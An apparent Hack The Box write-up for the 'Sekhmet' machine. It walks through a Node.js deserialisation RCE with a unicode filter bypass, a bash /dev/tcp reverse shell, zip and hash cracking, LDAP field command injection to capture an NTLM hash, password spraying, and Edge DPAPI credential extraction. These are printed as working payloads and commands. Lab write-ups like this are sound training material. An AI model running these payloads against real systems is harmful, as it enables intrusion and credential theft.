This writeup is so bad. :( I'll fix it later probs
# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/sekhmet 10.10.11.179

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: 403 Forbidden
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Checking port 80 shows a host name of, `www.windcorp.htb` (html page)

List of users from the website.
```
Walter White
Sarah Jhonson
William Anderson
Amanda Jepson
Saul Goodman
Sara Wilsson
Jena Karlis
Matt Brandon
John Larson
```

## vhost
```bash
ffuf -u http://10.10.11.179 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.windcorp.htb" -fs 153 -mc all
```

Finds a portal vhost.

## Portal subdomain
Login page which has a express header.
```
X-Powered-By: Express
```

Which means probs nodeJS

`admin:admin` logs into the site

Look at the request you can there is a b64 encoded cookie which updates how long you have been logged in for.
```
{"username":"admin","admin":"1","logon":1680408065092}
```

# Node js deserialisation
Trying this payload from hacktricks:
```
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ping -c 1 10.10.14.5', function(error, stdout, stderr) { console.log(stdout) })}()"}
```

This gets blocked by ModSecurity.

Try unicode to bypass a black list.
```
{"rce":"_$$\u004e\u0044_FUNC$$_\u0066unction(){ require('child_process').exec('ping -c 1 10.10.14.5', function(error, stdout, stderr) { console.log(stdout) })}()"}
```

Which works

Try a rev shell.
```
{"rce":"_$$\u004e\u0044_FUNC$$_\u0066unction(){ require('child_process').exec(\"bash -c 'bash -i >& /dev/tcp/10.10.14.5/9001 0>&1'\", function(error, stdout, stderr) { console.log(stdout) })}()"}
```

This works and now we have a shell!

# Foothold as webster
Drop a ssh key.
```
ssh-keygen -f sekhmet
#drop the .pub file into authorized_keys
chmod 600 authorized_keys
```

Download the backup.zip which is password protected :(

Looking at the zip file it was zipped using ZipCrypto which can be cracked using bkcrack.

```bash
7z l -slt backup.zip
```

```
Path = etc/passwd
Folder = -
Size = 1509
Packed Size = 554
Modified = 2022-05-01 01:27:46
Created = 
Accessed = 
Attributes = _ -rw-r--r--
Encrypted = +
Comment = 
CRC = D00EEE74

```

Grabbing `/etc/passwd` off the box shows it has the same CRC

Get the keys:
```
bkcrack-1.5.0-Linux/bkcrack -C backup.zip -c etc/passwd -P passwd.zip -p passwd

d6829d8d 8514ff97 afc3f825
```

Write a new pwd.
```
bkcrack-1.5.0-Linux/bkcrack -C backup.zip -k d6829d8d 8514ff97 afc3f825 -U unlock.zip Password1
```

hehe

extract the data.
```
7z x unlock.zip
```

Cool bash magic:
```
find var/ -type f -exec strings {} \;
```

This lists strings from all the files and finds a user.

```
ray.duncan@windcorp.htb
```

Domain IP:
```
192.168.0.2
```

Hash:
```
$6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe/u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF/hAj5ajIsm0zB.wg2zX81
```

Crack hash with hashcat
```bash
./hashcat hash.txt rockyou.txt -m 1800

pantera
```

Get a ticket as ray.duncan
```
kinit ray.duncan
```

Now we can do ksu to get a root shell.

User.txt
```
d1fc02f633dfbaaf048729e110bd3017
```

# Forwarding ports
Forward 1080 via ssh
```
~C #in revshell
ssh> -D1080
```

Then change `/etc/krb5.conf` to be:
```
[libdefaults]
	default_realm = WINDCORP.HTB

[realms]
    WINDCORP.HTB = { 
      kdc = hope.windcorp.htb
    }

[domain_realm]
	.windcorp.htb = WINDCORP.HTB
	windcorp.htb = WINDCORP.HTB
```

Then you can just run:
```
proxychains kinit ray.duncan
```

And everything will work :). **It didn't** I had to spend 30min debugging config files. :cry:

Anyways you need to drop a ssh key as root then do the ssh port forward and **now** we can do smb

```
proxychains smbclient -k -L \\hope.windcorp.htb\\
```

YAY!
```

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
	WC-Share        Disk      
```

Looking at WC-Share, there is a debug-users.txt file.

NETLOGON has a ps1 script which shows there is a phone field in ldap

## Dumping ldap
I'm going to do it on the box cause configuring more files sounds like pain.

Found a mobile field so lets change that.

ray.ldiff
```
dn: CN=Ray Duncan, OU=Development,DC=windcorp,DC=htb
changetype: modify
replace: mobile
mobile: Notaphone
```

Modify the ldap.
```
ldapmodify -H ldap://windcorp.htb -f duncan.ldiff
```

This works! So lets see if we can try to get a smb hash
```
dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
changetype: modify
replace: mobile
mobile: $(gci \\10.10.14.25\eljay\file)
```

Which doesn't work, maybe the other IP addr has a host name?
```
nslookup
> 192.168.0.2
hope.windcorp.htb
# What about the current box (webserver.windcorp.htb)
> webserver.windcorp.htb
192.168.0.100
```

Forwarding the smb port and changing the code exec.
```
ssh> -R 192.168.0.100:445:127.0.0.1:445
```

```
dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
changetype: modify
replace: mobile
mobile: $(gci \\webserver.windcorp.htb\eljay\file)
```

NTLM hash!!!
```
scriptrunner::WINDCORP:aaaaaaaaaaaaaaaa:e4f1b53b5259477437c2fdeb3f229fec:010100000000000000a2a6c82f66d9018abc320757279b6f00000000010010006700730064006100730072005900590003001000670073006400610073007200590059000200100070005a00590046007900510069006e000400100070005a00590046007900510069006e000700080000a2a6c82f66d90106000400020000000800300030000000000000000000000000210000fedd27e04276f0134aabab01ed2adb02f3a8115b84c9fbcc507479018c38df690a001000000000000000000000000000000000000900360063006900660073002f007700650062007300650072007600650072002e00770069006e00640063006f00720070002e006800740062000000000000000000
```

Which cracks to: `!@p%i&J#iNNo1T2`

So I guess username brute force. Dump names from ldap:
```
cat ldap.out |grep -i samaccountname | grep -v \$$ | awk '{print $2}' > users.txt
```

Get a hit!
```
./kerbrute_linux_amd64 passwordspray -d windcorp.htb users.txt '!@p%i&J#iNNo1T2'
2023/04/03 15:46:11 >  [+] VALID LOGIN:	 Bob.Wood@windcorp.htb:!@p%i&J#iNNo1T2
```

Evil-winrm as bob?
```
proxychains kinit bob.wood
proxychains evil-winrm -k -u bob.wood -r windcorp.htb -i hope.windcorp.htb
```

# Foothold on the host as bob
```
$ExecutionContext.SessionState.Languagemode
ConstrainedLanguage
```

:(

Lets just exfil a bunch of stuff first
## Exfil time
Found a SID
```
S-1-5-21-1844305427-4058123335-2739572863-2761
```

Dump some files.
```
Directory: C:\Users\Bob.Wood\APPDATA\roaming\microsoft\protect\S-1-5-21-1844305427-4058123335-2739572863-2761


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         8/22/2022   2:17 PM            740 3ebf1d50-8f5c-4a75-9203-20347331bad8
-a-hs-          5/4/2022   4:49 PM            740 a8bd1009-f2ac-43ca-9266-8e029f503e11

```

Convert the files to b64.
```
certutil -encode 3ebf1d50-8f5c-4a75-9203-20347331bad8 3ebf1d50-8f5c-4a75-9203-20347331bad8.b64
```

Then decode on linux host.

So these are the dpapi keys.
```
Directory: C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data\Default


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/4/2022   7:46 PM          55296 Login Data

Directory: C:\Users\Bob.Wood\APPDATA\local\microsoft\edge\User Data


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          5/4/2022   7:49 PM          39942 Local State

```
Useful :)

There is an encrypted_key in the Local State json dump which encrypts the passwords in the Login Data db, but is encrypted with dpapi.
```
"encrypted_key": "RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAAJEL2orPLKQ5JmjgKfUD4REAAAAAoAAABFAGQAZwBlAAAAA2YAAMAAAAAQAAAAERo760RqlJ/1NQi4Mzu/ZgAAAAAEgAAAoAAAABAAAAAWAlikfH8o+jE6a5gX3L2aKAAAACAUAaTmAnujTfLRzhFqjgv7O9AUtBxQzQK2W+gZfUU0M8NHuoRD4a4UAAAAjFmocvQLwq3PeEzWRbAz1o7pQWM="
```

Going to use pypykatz (import with pip)

debase64 the key:
```
echo 'RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAAAJEL2orPLKQ5JmjgKfUD4REAAAAAoAAABFAGQAZwBlAAAAA2YAAMAAAAAQAAAAERo760RqlJ/1NQi4Mzu/ZgAAAAAEgAAAoAAAABAAAAAWAlikfH8o+jE6a5gX3L2aKAAAACAUAaTmAnujTfLRzhFqjgv7O9AUtBxQzQK2W+gZfUU0M8NHuoRD4a4UAAAAjFmocvQLwq3PeEzWRbAz1o7pQWM='|base64 -d | cut -c6- > dpapi_blob
```

Use cut to get rid of the magic bytes cause you dont need them.

See what file to use:
```
pypykatz dpapi describe blob dpapi_blob

masterkey_guid: a8bd1009-f2ac-43ca-9266-8e029f503e11 

```

Get prekey:
```
pypykatz dpapi prekey password S-1-5-21-1844305427-4058123335-2739572863-2761 '!@p%i&J#iNNo1T2' > prekey
```

Get master_key:
```
pypykatz dpapi masterkey a8bd1009-f2ac-43ca-9266-8e029f503e11 prekey -o master_key
```

Get the creds:
```
pypykatz dpapi chrome --logindata Login.sqlite master_key LocalState >bobscreds.txt
```

bob.woodADM password:
```
smeT-Worg-wer-m024
```

evilwinrm again:

root.txt
```
12a44181f589342690fa8c39118980e0
```

LETS GO

FIN.
